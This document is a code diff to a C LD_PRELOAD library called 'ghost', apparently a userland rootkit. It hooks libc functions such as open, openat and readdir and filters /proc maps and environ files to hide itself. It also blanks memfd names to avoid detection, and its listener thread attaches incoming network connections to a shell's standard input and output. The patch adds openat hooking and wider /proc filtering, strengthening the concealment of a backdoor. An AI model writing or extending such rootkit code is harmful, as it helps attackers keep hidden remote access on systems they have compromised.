@@ -28,6 +28,7 @@ typedef int (*bind_t)(int, const struct sockaddr *, socklen_t);
 typedef struct dirent* (*readdir_t)(DIR *);
 typedef ssize_t (*recvmsg_t)(int, struct msghdr *, int);
 typedef int (*open_t)(const char *, int, ...);
+typedef int (*openat_t)(int, const char *, int, ...);
 typedef ssize_t (*read_t)(int, void *, size_t);
 typedef ssize_t (*write_t)(int, const void *, size_t);
 typedef int (*close_t)(int);
@@ -38,6 +39,7 @@ static bind_t real_bind = NULL;
 static readdir_t real_readdir = NULL;
 static recvmsg_t real_recvmsg = NULL;
 static open_t real_open = NULL;
+static openat_t real_openat = NULL;
 static read_t real_read = NULL;
 static write_t real_write = NULL;
 static close_t real_close = NULL;
@@ -45,12 +47,14 @@ static setsockopt_t real_setsockopt = NULL;
 static memfd_create_t real_memfd_create = NULL;
 
 static pthread_mutex_t ghost_fd_mutex = PTHREAD_MUTEX_INITIALIZER;
+static pthread_mutex_t filter_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 static int init_libc_funcs(void) {
     real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
     real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
     real_recvmsg = (recvmsg_t)dlsym(RTLD_NEXT, "recvmsg");
     real_open = (open_t)dlsym(RTLD_NEXT, "open");
+    real_openat = (openat_t)dlsym(RTLD_NEXT, "openat");
     real_read = (read_t)dlsym(RTLD_NEXT, "read");
     real_write = (write_t)dlsym(RTLD_NEXT, "write");
     real_close = (close_t)dlsym(RTLD_NEXT, "close");
@@ -62,7 +66,9 @@ static int init_libc_funcs(void) {
 static int is_ghost_path(const char *path) {
     if (!path) return 0;
     return (strstr(path, "/proc/self/maps") != NULL ||
-            strstr(path, "/proc/self/environ") != NULL);
+            strstr(path, "/proc/self/environ") != NULL ||
+            (strstr(path, "/proc/") != NULL && strstr(path, "/maps") != NULL) ||
+            (strstr(path, "/proc/") != NULL && strstr(path, "/environ") != NULL));
 }
 
 static int create_filtered_memfd(const char *content, size_t len) {
@@ -71,7 +77,7 @@ static int create_filtered_memfd(const char *content, size_t len) {
         return -1;
     }
     
-    int fd = real_memfd_create("ghost_filtered", MFD_CLOEXEC);
+    int fd = real_memfd_create("", MFD_CLOEXEC);
     if (fd < 0) return -1;
     
     if (real_write(fd, content, len) != (ssize_t)len) {
@@ -88,16 +94,33 @@ static int create_filtered_memfd(const char *content, size_t len) {
 }
 
 static char *filter_environ(const char *path) {
-    static char filtered[65536] = {0};
+    pthread_mutex_lock(&filter_mutex);
+    
+    static char *filtered = NULL;
+    static size_t filtered_size = 65536;
+    
+    if (!filtered) {
+        filtered = calloc(1, filtered_size);
+        if (!filtered) {
+            pthread_mutex_unlock(&filter_mutex);
+            return NULL;
+        }
+    }
+    
+    memset(filtered, 0, filtered_size);
+    
     if (!real_open || !real_read || !real_close) init_libc_funcs();
     
     int fd = real_open(path, O_RDONLY);
-    if (fd < 0) return NULL;
+    if (fd < 0) {
+        pthread_mutex_unlock(&filter_mutex);
+        return NULL;
+    }
     
     char buffer[4096];
-    ssize_t total = 0;
+    size_t total = 0;
     ssize_t n;
-    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
+    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < filtered_size - 1) {
         buffer[n] = '\0';
         
         char *src = buffer;
@@ -115,20 +138,38 @@ static char *filter_environ(const char *path) {
     }
     real_close(fd);
     
+    pthread_mutex_unlock(&filter_mutex);
     return filtered;
 }
 
 static char *filter_maps(const char *path) {
-    static char filtered[131072] = {0};
+    pthread_mutex_lock(&filter_mutex);
+    
+    static char *filtered = NULL;
+    static size_t filtered_size = 262144;
+    
+    if (!filtered) {
+        filtered = calloc(1, filtered_size);
+        if (!filtered) {
+            pthread_mutex_unlock(&filter_mutex);
+            return NULL;
+        }
+    }
+    
+    memset(filtered, 0, filtered_size);
+    
     if (!real_open || !real_read || !real_close) init_libc_funcs();
     
     int fd = real_open(path, O_RDONLY);
-    if (fd < 0) return NULL;
+    if (fd < 0) {
+        pthread_mutex_unlock(&filter_mutex);
+        return NULL;
+    }
     
     char buffer[4096];
-    ssize_t total = 0;
+    size_t total = 0;
     ssize_t n;
-    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
+    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < filtered_size - 1) {
         buffer[n] = '\0';
         
         char *src = buffer;
@@ -148,6 +189,7 @@ static char *filter_maps(const char *path) {
     }
     real_close(fd);
     
+    pthread_mutex_unlock(&filter_mutex);
     return filtered;
 }
 
@@ -184,6 +226,43 @@ int open(const char *path, int flags, ...) {
     }
     
     return real_open(path, flags, mode);
+}
+
+int openat(int dirfd, const char *path, int flags, ...) {
+    if (!real_openat) {
+        init_libc_funcs();
+    }
+    
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args;
+        va_start(args, flags);
+        mode = va_arg(args, int);
+        va_end(args);
+    }
+    
+    if (is_ghost_path(path)) {
+        if (strstr(path, "environ") != NULL) {
+            char *filtered = filter_environ(path);
+            if (filtered && *filtered) {
+                int memfd = create_filtered_memfd(filtered, strlen(filtered));
+                if (memfd >= 0) {
+                    return memfd;
+                }
+            }
+        }
+        else if (strstr(path, "maps") != NULL) {
+            char *filtered = filter_maps(path);
+            if (filtered && *filtered) {
+                int memfd = create_filtered_memfd(filtered, strlen(filtered));
+                if (memfd >= 0) {
+                    return memfd;
+                }
+            }
+        }
+    }
+    
+    return real_openat(dirfd, path, flags, mode);
 }
 
 struct dirent *readdir(DIR *dirp) {
@@ -303,9 +382,7 @@ void *ghost_listener(void *arg) {
         if (client_fd >= 0) {
             pid_t pid = fork();
             if (pid == 0) {
-                pthread_mutex_lock(&ghost_fd_mutex);
                 int my_ghost_fd = ghost_fd;
-                pthread_mutex_unlock(&ghost_fd_mutex);
                 if (my_ghost_fd >= 0) close(my_ghost_fd);
                 unsetenv("LD_PRELOAD");
                 dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
@@ -355,10 +432,11 @@ void init_ghost(void) {
 __attribute__((destructor))
 void cleanup_ghost(void) {
     should_run = 0;
-    pthread_mutex_lock(&ghost_fd_mutex);
-    if (ghost_fd >= 0) {
-        close(ghost_fd);
-        ghost_fd = -1;
+    if (pthread_mutex_trylock(&ghost_fd_mutex) == 0) {
+        if (ghost_fd >= 0) {
+            close(ghost_fd);
+            ghost_fd = -1;
+        }
+        pthread_mutex_unlock(&ghost_fd_mutex);
     }
-    pthread_mutex_unlock(&ghost_fd_mutex);
 }
